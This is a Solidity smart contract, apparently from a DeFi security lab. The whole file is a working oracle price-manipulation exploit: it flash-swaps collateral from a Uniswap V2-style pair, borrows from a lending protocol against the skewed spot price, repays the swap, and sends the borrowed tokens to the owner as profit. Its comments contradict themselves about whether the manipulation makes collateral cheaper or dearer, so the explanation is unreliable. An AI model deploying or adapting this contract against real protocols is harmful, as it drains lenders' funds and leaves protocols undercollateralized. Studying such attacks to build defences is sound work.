// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// Attack Vector: Oracle Price Manipulation
// Steps:
// 1. Flash swap từ DEX để manipulate price
// 2. Borrow từ Lending protocol với giá manipulated
// 3. Repay flash swap
// 4. Profit

import "../dex/interfaces/IUniV2Pair.sol";
import "../interfaces/CommonInterfaces.sol";

interface ILending {
    function deposit(uint256 amount) external;
    function borrow(uint256 amount) external;
    function withdraw(uint256 amount) external;
    function repay(uint256 amount) external;
}

contract Attacker_Oracle {
    address public owner;
    IUniV2Pair public pair;
    ILending public lending;
    address public collateralToken;
    address public borrowToken;
    
    bool private attacking;
    uint256 private borrowAmount;
    
    event AttackInitiated(uint256 flashAmount);
    event PriceManipulated(uint256 reserveBefore0, uint256 reserveBefore1, uint256 reserveAfter0, uint256 reserveAfter1);
    event BorrowedFromLending(uint256 amount);
    event AttackCompleted(uint256 profit);

    constructor(address _pair, address _lending, address _collateralToken, address _borrowToken) {
        owner = msg.sender;
        pair = IUniV2Pair(_pair);
        lending = ILending(_lending);
        collateralToken = _collateralToken;
        borrowToken = _borrowToken;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    // Step 1: Initiate attack with flash swap
    function attack(uint256 flashAmount, uint256 _borrowAmount) external onlyOwner {
        require(!attacking, "Already attacking");
        attacking = true;
        borrowAmount = _borrowAmount;
        
        emit AttackInitiated(flashAmount);
        
        // Get reserves before manipulation
        (uint112 r0Before, uint112 r1Before,) = pair.getReserves();
        
        // Determine which token to flash swap
        address token0 = pair.token0();
        bool isToken0Collateral = token0 == collateralToken;
        
        // Flash swap collateral token to manipulate price
        if (isToken0Collateral) {
            pair.swap(flashAmount, 0, address(this), abi.encode(flashAmount));
        } else {
            pair.swap(0, flashAmount, address(this), abi.encode(flashAmount));
        }
        
        // Get reserves after manipulation and repayment
        (uint112 r0After, uint112 r1After,) = pair.getReserves();
        emit PriceManipulated(r0Before, r1Before, r0After, r1After);
        
        attacking = false;
        
        // Calculate profit
        uint256 profit = IERC20(borrowToken).balanceOf(address(this));
        emit AttackCompleted(profit);
    }

    // Step 2: Uniswap V2 callback - called during flash swap
    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(msg.sender == address(pair), "Not pair");
        require(sender == address(this), "Not sender");
        require(attacking, "Not attacking");
        
        uint256 flashAmount = abi.decode(data, (uint256));
        uint256 amountReceived = amount0 > 0 ? amount0 : amount1;
        
        // Now we have flash swapped collateral tokens
        // Price of collateral is now LOWER (we removed liquidity)
        // But if oracle reads spot price, it will show collateral as CHEAPER
        // So we can deposit small collateral and borrow more
        
        // Deposit a small amount as collateral
        uint256 depositAmount = amountReceived / 10; // Only 10% of flash loan
        IERC20(collateralToken).approve(address(lending), depositAmount);
        lending.deposit(depositAmount);
        
        // Now borrow - the manipulated oracle will think our collateral is worth more
        // (because we've skewed the pool reserves)
        lending.borrow(borrowAmount);
        emit BorrowedFromLending(borrowAmount);
        
        // Calculate repayment (with 0.3% fee)
        uint256 amountToRepay = (flashAmount * 1000) / 997 + 1;
        
        // Repay flash swap
        IERC20(collateralToken).transfer(address(pair), amountToRepay);
        
        // Keep the borrowed tokens as profit!
        // (In reality, the lending protocol is now undercollateralized)
    }

    // Withdraw profits
    function withdraw() external onlyOwner {
        uint256 balance = IERC20(borrowToken).balanceOf(address(this));
        IERC20(borrowToken).transfer(owner, balance);
    }

    // Emergency: withdraw any token
    function emergencyWithdraw(address token) external onlyOwner {
        uint256 balance = IERC20(token).balanceOf(address(this));
        if (balance > 0) {
            IERC20(token).transfer(owner, balance);
        }
    }
}

